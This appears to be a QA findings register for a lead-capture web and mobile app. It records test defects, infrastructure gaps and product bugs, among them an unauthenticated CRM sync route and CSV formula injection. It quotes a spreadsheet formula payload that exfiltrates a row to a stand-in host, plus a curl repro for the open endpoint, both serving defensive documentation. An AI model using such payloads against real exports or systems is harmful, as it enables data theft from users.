# LR Testing — Findings Register

> Brief §12: *"The defect list is the most valuable output of this project. A prompt that
> finds twelve real bugs and fixes none of them has done its job perfectly."*
>
> Every entry becomes a separate reviewed piece of work. **Nothing here has been fixed.**
>
> Last updated: end of Prompt 4.

## Legend

| Field | Meaning |
|---|---|
| Severity | Brief §8 — P0 catastrophic, P1 critical workflow, P2 major, P3 minor |
| Kind | `product-defect` — real bug · `test-defect` — the test is wrong, not the code · `infrastructure` — missing capability that blocks testing · `doc-drift` — documentation disagrees with the code |
| Status | `recorded` — found, not acted on (the default and correct outcome for this project) |

---

## Infrastructure blockers

### LR-INF-001 — No test database exists · **P0 · infrastructure · recorded**

`.env.local`, `.env.production.local` and `.env.vercel.local` all resolve to the **same
Supabase project ref**. There is no non-production database.

**Impact.** Blocks the database half of Prompts 4, 5, 8 and 12. Specifically it blocks
plan §50 in full — RLS read/write/delete per role per table — which Prompt 1 found has
zero real coverage today.

**Repro.**
```bash
# All three print the same project ref:
grep -h NEXT_PUBLIC_SUPABASE_URL .env.local .env.production.local .env.vercel.local
# The runner's guard confirms and refuses:
set -a && . ./.env.local && set +a && npm run test   # → exit 78
```

**Consequence taken.** `tests/db/rls-enforcement.test.ts` is written and committed, and
reported `not-run` by the runner — never as a pass. `buildFixture()` deliberately throws
rather than returning an empty context, because a silently empty fixture would make every
assertion in the file pass vacuously.

**To resolve.** Create a separate Supabase project, apply migrations 0001–0097, then set
`LR_TEST_SUPABASE_URL`, `LR_TEST_SUPABASE_SERVICE_ROLE_KEY`, and add the ref to
`LR_TEST_ALLOWED_SUPABASE_REFS`.

### LR-INF-002 — Mobile repository has uncommitted work · **P1 · infrastructure · recorded**

`MOBILE` `main` carries 7 uncommitted files of in-flight OAuth callback work by another
author. Prompts 6, 7 and 10 write to that repo.

**Consequence taken.** Nothing was modified. Prompt 3's mobile seams were committed to a
separate `test/03-seams` branch containing only three new files. Prompt 6 should not start
until the tree is clean.

---

## Test defects — tests that are wrong, where the product is correct

### LR-TEST-001 — 12 failing tests on `main`, none a product defect · **P1 · test-defect · recorded**

The suite exits 1 on `main`, before this project changed anything. All 12 failures are
source-text assertions broken by refactors that preserved behavior.

The clearest case, and the one that best justifies the whole project:

```js
// tests/documents-email-account-isolation.test.ts:129
it("Company A cannot patch or delete Company B template IDs", () => {
  const route = read("app/api/exhibitor/email-templates/[templateId]/route.ts");
  assert.match(route, /role === "exhibitor_admin"/);   // ← fails here
```

The route was refactored to `isCompanyAccountAdminSession(sessionUser)`. The literal is
gone; the test fails. The invariant is intact — verified directly: the admin gate is at
lines 28 and 129, and `.eq("account_id", accountId)` scopes every read, update and delete
at lines 70–71, 148–150 and 174–175.

So a test named for a P0 cross-tenant invariant is **a false green and a false red at
once**: it would pass with the scoping deleted, and it currently fails for a reason
unrelated to tenancy.

**Full list.** `BASELINE_AUDIT.md` §3.

**Consequence taken.** Not fixed. Prompt 4 wrote behavioral replacements
(`tests/isolation/email-templates-tenant-isolation.test.ts`, 12 tests) that invoke the
real handlers. The stale tests remain, still failing, until someone reviews their removal.

### LR-TEST-002 — 396 web test cases assert source text, not behavior · **P1 · test-defect · recorded**

17% of web cases read a `.ts` or `.sql` file and regex it. 46 files are 100% of this
shape. Highest concentrations: `intelligence-readmodel` (88 cases), `import` (70),
`dashboards` (60), `lead-domain` (60), `api-contract` (41).

Worst individual cases: `tests/briefing-rls-exhibitor-admin.test.ts` (7/7) asserts an RLS
policy exists by grepping migration SQL and never connects to Postgres;
`tests/cross-tenant-resource-isolation.test.ts` (5/6) proves the plan's §2 P0 invariant by
regex.

### LR-TEST-003 — The `journeys/` lane is not end-to-end · **P2 · test-defect · recorded**

`tests/journeys/*.e2e.test.ts` (14 files) gate every live-database leg behind
`JOURNEY_LIVE_DB=1`, which is unset everywhere. With the flag off they fall back to
source-text contract assertions — e.g. `lead-create.e2e.test.ts` asserts
`/let status: LeadStatus = "new"/`. The `.e2e` name will mislead anyone reading a CI
summary. Either wire to a real database or rename.

### LR-TEST-004 — My own isolation test initially failed to catch a real break · **P1 · test-defect · resolved during Prompt 4**

Recorded because the mechanism generalises. The first version of
`email-templates-tenant-isolation.test.ts` sent `{ name: "hijacked" }` to PATCH. The
handler requires `name` **and** `subject` **and** `body`, so it returned 400 at validation
and never reached the database. The test asserted "not 200, and B unchanged" — both true,
neither because of scoping.

Caught by running the plan §80 deliberate-break drill: with every
`.eq("account_id", accountId)` stripped from the route, only **1 of 12** tests went red.
After sending complete payloads, **3 of 12** go red.

**Lesson for Prompts 5–14.** A negative test must reach the layer it claims to test.
Validation rejecting the request first is indistinguishable, from the outside, from
authorization rejecting it. Every new denial test should be drill-verified.

---

## Product findings

### LR-PROD-001 — No lease expiry for a stuck workflow step · **P1 · product-defect · recorded**

`lib/workflows/runner/claim-next-step.ts` claims a step by compare-and-set, moving it
`queued → running`. Nothing moves it back. A step whose handler dies after the claim but
before completion stays `running` forever and is never retried.

The topology makes this reachable: `/api/internal/workflow-tick` accepts cron `GET` *and*
an in-process `POST` kick from `emitLeadCaptured`, so two invocations can overlap. The CAS
guard prevents a double claim, but there is no recovery for the claim that then stalls.

`reconcileStaleConversationProcessing` exists for conversations; there is no equivalent for
`workflow_step_runs`.

**Owner.** Prompt 9 should assert the CAS race and record the missing lease as a gap.

### LR-PROD-002 — `prisma-query-logger.js` is dead and syntactically invalid · **P3 · product-defect · recorded**

`WEB/prisma-query-logger.js` calls `prisma.('query', …)` at lines 11, 15 and 19 — missing
the `$on` method name entirely. It is not valid JavaScript and would throw at parse time.
Nothing imports it; only `types/prisma-query-logger.d.ts` declares the module.
`@prisma/client` is not a dependency. Delete both.

### LR-PROD-003 — `documents.is_archived` has no reachable archive operation · **P2 · product-defect · recorded**

`0021_documents_hub.sql:14` adds `is_archived`, but the DELETE route hard-deletes and no
route sets the column. Either dead schema or a missing feature; needs a product decision.

### LR-PROD-004 — `OPENAI_MODEL` is unpinned · **P1 · product-defect · recorded**

`lib/campaigns/llm-draft-generator.ts:38` defaults to `gpt-4o-mini` with no assertion
anywhere. Plan §70 requires a model identifier change to be a release-gated event. Today
the provider can change model behavior under the product with no deploy and no signal.

**Owner.** Prompt 11.

### LR-PROD-005 — TypeScript and SQL guardrail merges disagree on absent keys · **P3 · product-defect · recorded**

`mergeGuardrailsPatch` spreads `defaultBriefingGuardrails()` first, so it materialises all
four guardrail keys, back-filling absent ones with `false`. The SQL authority,
`patch_event_briefing_strategy` (migration 0097), uses the JSONB `||` operator and merges
only the keys present, leaving the rest absent.

For a legacy event row with partial guardrails the client says `technicalDeepDive: false`
where the database says nothing at all. Both read as falsy today, so no behaviour is known
to be broken — but any consumer distinguishing "never configured" from "explicitly off"
would get two different answers depending on which merge produced the value.

**Repro.** `tests/lead-domain/briefing-strategy-autosave.test.ts` → *"DOCUMENTED
DIVERGENCE"*. Pinned rather than asserted-equal; if the two ever converge the test goes
red and this finding can be closed.

### LR-PROD-006 — CSV export does not neutralize formula injection · **P1 · product-defect · recorded**

`lib/server/leads/csvFormat.ts` → `escapeCsvCell` implements RFC 4180 quoting and nothing
else. A cell beginning `=`, `+`, `-` or `@` is written verbatim, so Excel, LibreOffice and
Google Sheets evaluate it on open.

This matters because lead fields are **attacker-influenced**: `full_name`, `job_title` and
`company_text` arrive from badge scans, business-card OCR, manual entry and CSV import. A
lead named `=HYPERLINK("http://evil.test?d="&A1,"Click")` exfiltrates the adjacent row when
an exhibitor opens their own export.

RFC 4180 quoting is not a mitigation: the parser strips quoting before evaluation, so a
quoted formula is still live.

**Repro.**
```ts
import { escapeCsvCell } from "@/lib/server/leads/csvFormat";
escapeCsvCell("=1+1");        // → "=1+1"   (evaluates on open)
escapeCsvCell("@SUM(A1)");    // → "@SUM(A1)"
```

**Tests.** `tests/lead-domain/leads-export-security.test.ts` — 8 cases `.skip`ped with
`KNOWN-DEFECT: LR-PROD-006`, plus one running test that documents the current behaviour so
the finding cannot go stale. Plan §52 names this class explicitly.

**Usual fix** (not applied): prefix a formula-initiating value with `'` or a tab before
quoting.

### LR-PROD-007 — Two incompatible definitions of "hot" · **P1 · product-defect · recorded**

| Helper | Hot threshold |
|---|---|
| `legacyPriorityScoreToLeadTemperature` (`lib/leads/temperature.ts:25`) | score **≥ 67** |
| `isHotOrAbovePriorityScore` / `scoreToPriorityLevel` (`lib/leads/priorityLevels.ts:30,50`) | score **≥ 80** |

**Scores 67–79 — thirteen values — are `hot` by temperature and `high` (not hot) by
priority level.** Which answer a surface gets depends on which helper it calls.

Brief §7 makes `temperature = hot` an explicit cross-surface contract, and Prompt 8 item 13
requires identical hot classification across event and account dashboards, organizer,
campaigns, Leads, detail, and mobile. This is precisely the §41 reconciliation failure: two
surfaces counting the same leads and disagreeing.

The divergence has likely gone unnoticed because the canonical hot score,
`leadTemperatureToLegacyPriorityScore("hot") = 85`, clears both thresholds. It bites only
for scores arriving from other paths — enrichment, computed priority, imported values.

**Repro.**
```ts
legacyPriorityScoreToLeadTemperature(70);  // "hot"
isHotOrAbovePriorityScore(70);             // false
scoreToPriorityLevel(70);                  // "high"
```

**Tests.** `tests/lead-domain/lead-canonical-semantics.test.ts` — one `.skip`ped
`KNOWN-DEFECT: LR-PROD-007`, plus a running test that computes the disagreeing band
(67–79, 13 values) so a threshold change on either side is caught.

**Owner.** Prompt 8 must not assume these agree when reconciling hot counts.

### LR-PROD-008 — `isLeadTemperature` is a lying type guard · **P3 · product-defect · recorded**

Declared `value is LeadTemperature`, but it accepts non-canonical spellings — `"Hot"`,
`" hot "` — and returns `true`. TypeScript then believes the value is `"hot"|"warm"|"cold"`
when it is not, so `LEAD_TEMPERATURE_LABEL[value]` yields `undefined` and the label renders
blank.

**Repro.**
```ts
isLeadTemperature("Hot");                 // true
LEAD_TEMPERATURE_LABEL["Hot" as never];   // undefined  ← the symptom
LEAD_TEMPERATURE_LABEL[parseLeadTemperature("Hot")!]; // "Hot"  ← the safe path
```

Either make the guard strict, or narrow through `parseLeadTemperature`.

**Tests.** `tests/lead-domain/lead-canonical-semantics.test.ts` — one `.skip`ped
`KNOWN-DEFECT: LR-PROD-008`, plus a running test proving the `undefined` lookup.

---

## Prompt 7 — conversation and voice pipeline (plan §69)

### LR-PROD-012 — No failure classification before retry · **P1 · product-defect · recorded**

Plan §69 requires: *"failure classification before retry — retry eligibility derives from
error category, and a bulk reprocess is impossible without classification."*

There is no classification. `lead_conversations` stores `transcription_error` and
`synthesis_error` as **free text** (migrations 0013, 0090). There is no error category
column and no attempt counter. `leadConversationNeedsProcessing`
(`lib/conversations/lead-conversation-needs-processing.ts:13`) returns `true` for any
`failed` status without ever reading the error, so a permanently-failed record — zero-byte
audio, corrupt container, missing storage path — stays eligible for retry forever, and a
bulk reprocess cannot separate "retry this" from "this will never succeed".

The gate's input type is the whole contract, and it has nowhere to put a category:

```ts
type LeadConversationProcessingSnapshot = {
  transcription_status, synthesis_status, transcript, summary   // no error, no attempts
};
```

**Repro.** Ten reprocess passes over a record with `transcription_status: "failed"` and a
permanent cause return `true` ten times — asserted in the suite.

**Notable:** one terminal case *is* handled — transcription completed with an empty
transcript returns `false`, so no-speech recordings do not retry-loop. The concept was
understood; it was never generalised, which makes the fix a generalisation rather than a
new mechanism.

**Tests.** `WEB/tests/conversation/processing-classification.test.ts` — 4 `.skip`ped
`KNOWN-DEFECT: LR-PROD-012`, plus running tests documenting the loop.

### LR-RISK-002 — Recording-to-lead binding falls back to the current screen · **P2 · product-defect · recorded**

`MOBILE/screens/LeadDetailScreen.tsx:1403`:

```ts
const recordingLeadId = activeRecordingSessionRef.current?.leadId ?? leadId;
```

The ref holds the lead captured when recording **started**, which is correct, and it is
consulted first. The `??` falls back to the **current screen's** lead. If the session ref is
ever empty at stop time — a remount, a cleared ref, a stop path running after navigation —
the recording binds to whichever lead is on screen now. That is the shape of the §69
production defect: *"recording started on Lead A, user navigates to Lead B, audio saves to
Lead A."*

The persistence layer below it is clean: `persistQueuedConversationUpload` takes an explicit
`localId`, uses it for the payload, the outbox entity and the `local_leads` update, and
reads no screen or global state. Verified in the suite.

**Tests.** `MOBILE/lib/conversation/recordingBindingContract.test.ts` (documented), and
`MOBILE/.maestro/flows/subflows/recording_binds_to_originating_lead.yaml` —
**`requires-device`, not executed.**

---

## Prompt 8 — intelligence, dashboards, fallback provenance

### LR-RISK-003 — Day-window check compares ISO strings lexically · **P2 · latent · recorded**

`isInstantInEventDay` (`lib/events/event-calendar.ts:88`) compares wire strings directly:

```ts
return value >= day.startIso && value < day.endExclusiveIso;
```

`startIso`/`endExclusiveIso` come from `toISOString()`, so they always carry `.000Z`. An
instant rendered with a `+00:00` offset — **PostgREST's default for `timestamptz`** — sorts
incorrectly against them, because `"+"` (0x2B) precedes `"."` (0x2E). Wrong at the boundary
**in both directions**:

| Instant | Expected | Actual |
|---|---|---|
| `2026-08-11T04:00:00+00:00` (exactly local midnight) | inside the day | **excluded** |
| `2026-08-12T04:00:00+00:00` (next local midnight) | outside the day | **included** |

Mid-day values are unaffected, which is why casual testing would not surface it.

**Currently latent.** No file under `lib/` or `app/` calls this helper — live dashboard
metrics come from the `dashboard_event_lead_metrics` Postgres RPC, which windows in SQL. A
trap for the next caller rather than a live defect, and rated P2 on that basis.

**Tests.** `WEB/tests/dashboards/event-timezone-truth.test.ts` — one `.skip`ped
`KNOWN-DEFECT: LR-RISK-003`, a running test pinning the misclassification, **and a guard
test that fails the moment the helper gains a production caller**, forcing a re-rate before
that caller ships.

**Fix direction** (not applied): compare `Date.parse()` values rather than strings.

---

## Prompt 9 — workflows, campaigns, signals

### LR-RISK-004 — Unknown template placeholders are silently deleted · **P2 · product-defect · recorded**

`resolvePromptVariables` (`lib/campaigns/signal-prompt-composer.ts:245`) substitutes the
twelve keys in `KNOWN_PROMPT_PLACEHOLDER_KEYS`, then `stripUnknownPlaceholders` removes
**anything else** matching `{{…}}` or `{…}`.

A user who types `{{event_name}}` — a plausible guess, and the internal field genuinely is
`eventName` — gets it erased rather than flagged:

```ts
resolvePromptVariables("Following up from {{event_name}} today", ctx)
// → "Following up from today"      ← gap, no error raised
```

The correct token is `{{event}}`. §42 requires "no unresolved template variables", which this
satisfies literally — but by deletion, so a malformed subject line reaches a real recipient
with a visible gap instead of failing validation.

**Mitigation in place:** `KNOWN_PROMPT_PLACEHOLDER_KEYS` drives UI hints. A typo still slips
through silently.

**Redeeming property, asserted:** a customer never sees a raw `{{token}}`.

**Tests.** `WEB/tests/campaigns/draft-identity-and-scope.test.ts` — a documented test for the
strip behaviour, plus a guard asserting **every advertised key actually resolves**.

---

## Prompt 10 — Google provider contract

### LR-PROD-013 — Fixed-offset timezone identifiers are accepted by the calendar picker · **P2 · product-defect · recorded**

There are **two** `isIanaTimeZone` implementations with different strictness:

| Module | Behaviour | `"EST"` |
|---|---|:---:|
| `lib/events/event-calendar.ts` | strict — requires `"UTC"` or a `/` | rejected |
| `lib/integrations/google/calendar-core.ts` | permissive — anything `Intl` accepts | **accepted** |

`"EST"` is a **fixed** UTC-5 zone with no DST rules. Booking 2:30 PM with it produces
`19:30Z` in both August and January, whereas `America/New_York` correctly produces `18:30Z`
in August. **An August meeting is created one hour late.**

```ts
zonedLocalToIso("2026-08-12T14:30", "EST")               // 2026-08-12T19:30:00.000Z
zonedLocalToIso("2026-08-12T14:30", "America/New_York")  // 2026-08-12T18:30:00.000Z  ← correct
```

In January the two agree, which is why this survives casual testing. `"EST5EDT"` is likewise
accepted, and `"Etc/GMT+5"` slips past **both** validators because it contains a `/`.

**Affected surface:** meeting scheduling and the availability slot picker (§47).

**Tests.** `WEB/tests/provider/calendar-availability.test.ts` — one `.skip`ped
`KNOWN-DEFECT: LR-PROD-013`, plus running tests documenting the one-hour error and the
disagreement between validators.

### LR-INF-003 — No Google sandbox Workspace domain · **P2 · infrastructure · recorded**

Plan §76 Tier 2 requires a dedicated Google Workspace test domain running the provider
contract suite nightly. None is configured.

**Impact:** 16 of 59 assigned cases cannot run — real consent, denied and partial scope,
wrong-account selection, provider-side revocation, real mailbox receipt, Sent-mailbox
behaviour, bounce classification, private-event visibility, multiple calendars, real meeting
create/edit/cancel, external deletion, and Meet link creation.

**Not a blocker** (Brief §10). Tier 1 covers 41 of 59 — 69% — because most provider
behaviour is our own state machine. Assignment recorded in
`docs/testing/PROVIDER_TEST_TIERS.md`.

---

## Prompt 11 — AI output, prompt scope, drift

### LR-PROD-014 — Campaign drafts ship a DUPLICATED signature · **P1 · product-defect · recorded**

Every draft where the model produces its own sign-off — which the prompt **explicitly
instructs it to do** — is sent with the signature twice.

```
…Text.

Best, Priya Raman

Best,
Priya Raman
```

**Root cause is order of operations** in `generateLeadDraftWithLLM`
(`lib/campaigns/llm-draft-generator.ts:233`):

1. `sanitizeFinalEmailBody` collapses `"Best,\nPriya Raman"` onto one line →
   `"Best, Priya Raman"`.
2. `ensureSenderSignature` (line 186) strips an existing signature with a regex requiring
   the closing word and the name on **separate lines**.
3. Step 1 already joined them, so step 2 matches nothing and appends a second signature.

**Reproduces for `Best,` / `Thanks,` / `Regards,`.** Only a model response with *no* sign-off
produces a correct single signature — and the system prompt says *"closing word
(Best,/Thanks,); exactly this sender name on final line alone"*, so the broken path is the
**common** one.

**Affected surface:** every generated campaign draft and one-to-one follow-up email that
reaches a customer.

**Tests.** `WEB/tests/ai/model-pinning-and-failure.test.ts` — one `.skip`ped
`KNOWN-DEFECT: LR-PROD-014` covering all three closings, plus running tests pinning the
duplication and proving the prompt asks for the sign-off.

**Fix direction** (not applied): strip the signature *before* sanitisation, or make the strip
regex tolerate a collapsed single-line sign-off.

---

## Prompt 12 — API contract, async, client compatibility

### LR-PROD-015 — Unauthenticated CRM data egress with an attacker-supplied lead ID · **P0 · product-defect · recorded**

`app/api/admin/integrations/hubspot/test-sync/route.ts` exports a `POST` handler that
performs **no authentication, no role check and no company scoping**. It reads a `leadId`
from the request body and hands it straight to the CRM:

```ts
export async function POST(request: Request) {
  const payload = await request.json().catch(() => ({}));
  const leadId = String(payload.leadId ?? "").trim();
  if (!leadId) return NextResponse.json({ ... }, { status: 400 });
  const result = await syncLeadToHubSpot(leadId);   // ← no caller identity, no scope
}
```

Middleware does not save it: `middleware.ts` calls `updateSession`, which refreshes the auth
cookie but never returns 401, so an unauthenticated request reaches the handler.

**Why P0.** Plan §53: *"Security failures that expose another tenant/event are P0 regardless
of how obscure the UI path is."* This is simultaneously **unauthenticated**, an **IDOR/BOLA**
(object identifier from the request body, never checked against the caller's company), and
**data egress** — §74's concern exactly.

**Repro.**
```bash
curl -X POST https://<host>/api/admin/integrations/hubspot/test-sync \
  -H 'content-type: application/json' \
  -d '{"leadId":"<any lead uuid>"}'
```
No cookie, no bearer.

**Mitigating factors** (do not change the rating): requires a valid lead UUID, and HubSpot
credentials must be configured. Neither is an access control.

**Tests.** `WEB/tests/api/route-inventory-and-middleware.test.ts` — one `.skip`ped
`KNOWN-DEFECT: LR-PROD-015`, plus running tests pinning the route's shape and asserting **the
set of unauthenticated mutation routes has exactly one member**, so a second cannot appear
unnoticed.

**How it was found:** the route inventory census. Five other flagged routes authenticate via
`supabase.auth.getUser()` or `authorizeGoogleWorkspaceAdmin()`, which the first detector did
not recognise; two more (`/api/invites/claim`, `/api/e2e/auth-bypass`) are legitimately
pre-auth and are allowlisted with stated reasons. Only this one survived review.

### LR-RISK-005 — `x-dev-bypass` is a header-based bypass outside the flag inventory · **P3 · risk · recorded**

`middleware.ts` short-circuits session handling when the request carries
`x-dev-bypass: true`. Both branches are correctly gated on `NODE_ENV === "development"`, so
this is **not** currently exploitable — tests assert both gates and that no branch keys on
the header alone.

Recorded because `BYPASS_FLAG_INVENTORY.md` enumerates **environment variables**; a
request-header bypass would be missed by that sweep.

---

## Prompt 13 — security, bypass paths, configuration

### LR-RISK-006 — Apple review login falls back to a hardcoded personal email · **P2 · risk · recorded**

`lib/auth/apple-review-login-policy.ts:12` defines a `DEFAULT_APPLE_REVIEW_EMAIL`, and
`getAppleReviewLoginDenialReason()` passes
`process.env.APPLE_REVIEW_EMAIL ?? DEFAULT_APPLE_REVIEW_EMAIL`.

So setting **only** `APPLE_REVIEW_LOGIN_ENABLED=true` silently enables review login for one
hardcoded personal address. "Enable the flag" is not the whole configuration story, and the
default belongs in an environment variable rather than in source.

**Compounding factor:** unlike the E2E bypass, this gate has **no production check** —
`getAppleReviewLoginDenialReasonFromEnv` never inspects `NODE_ENV` or `VERCEL_ENV`. That is
deliberate, because Apple reviews the production app, but it means **the email allowlist
carries the entire weight** of the control. Both facts are pinned by running tests.

**Not third-party exploitable:** it grants access only to an address the attacker would have
to control.

**Tests.** `WEB/tests/security/bypass-gates.test.ts`.

### Two `*_DEBUG` flags found by the scanner, missed by the manual sweep

Prompt 13's automated scanner found `LEAD_ROUTE_DEBUG` and `LEAD_BRIEFING_RLS_DEBUG`, which
the Prompt 1 manual sweep missed. That is the argument for the scanner existing.
`BYPASS_FLAG_INVENTORY.md` now lists **thirteen** env flags plus one header bypass, and
`WEB/tests/security/bypass-gates.test.ts` fails when a bypass-shaped flag appears in `app/`
or `lib/` without an inventory row.

---

## Prompt 14 — performance, resilience, observability, governance

No new product defects. Two false positives in my own architecture gates were caught before
commit and are recorded because they shaped the gates:

- **`import type` from a `server-only` module is erased at compile time** and is harmless.
  Two components do this legitimately. The gate now flags only *value* imports, with a guard
  test asserting the type-only form stays type-only.
- **`alert (coming soon)` in JSX prose is not a call.** The forbidden-pattern check now
  requires no whitespace before the paren.

Confirmed correct and pinned: no service-role key or admin client in any `use client` file;
the anon key is the only Supabase key client code references; the four deprecated fields
(`is_hot`, `quick_tags`, `qr_value`, `raw_payload`) are absent from active code; no committed
`.only` or `debugger`; every `.skip` carries a stated reason; and no test file is empty of
cases.

---

## Deferred — live customer event

A customer event was running during this run, so no test was permitted to write to
production.

### LR-DEFER-001 — Production write and canary journeys · **deferred-live-event**

Deferred, not skipped. Where written, these are tagged `category=prod-safe` with
`prodWrites=true` and routed to `not-run` by the runner's live-event guard
(`LR_LIVE_EVENT=1`). Read-only production checks are unaffected.

Covers Prompt 5 items 13–14 (cross-surface lead creation in Event A and Event B), Prompt 10
Tier 3 provider canaries, and Prompt 14 production smoke. Re-run with `LR_LIVE_EVENT`
unset once the event has finished.

---

## Summary

Reconciled against the integrated branch `test/integration-prompts-05-14` (both repos).

| Kind | P0 | P1 | P2 | P3 | Total |
|---|---:|---:|---:|---:|---:|
| product-defect | 4 | 5 | 5 | 3 | 17 |
| risk | — | — | 4 | 1 | 5 |
| infrastructure | 1 | 1 | 1 | — | 3 |
| test-defect | — | 3 | 1 | — | 4 |
| doc-drift | — | — | 1 | 2 | 3 |
| deferred (live event) | — | — | — | — | 1 |
| **Total** | **5** | **9** | **12** | **6** | **33** |

**Four product P0s**, in two clusters:

- **LR-PROD-015** — one unauthenticated API route that egresses lead data to an external
  CRM with an attacker-supplied id.
- **LR-PROD-009 / 010 / 011** — device handover. These **compound**: sign-out leaves the
  data, the outbox has no owner column to scope by, and the one purge that exists is
  incomplete. Fixing any single one does not close the hole.

**24 KNOWN-DEFECT skips** on the integrated branch, each linked to a finding and each paired
with a running test that documents current behaviour — so a fix turns the documentation test
red rather than leaving a stale finding.

**Nothing here has been fixed.** Brief §6.
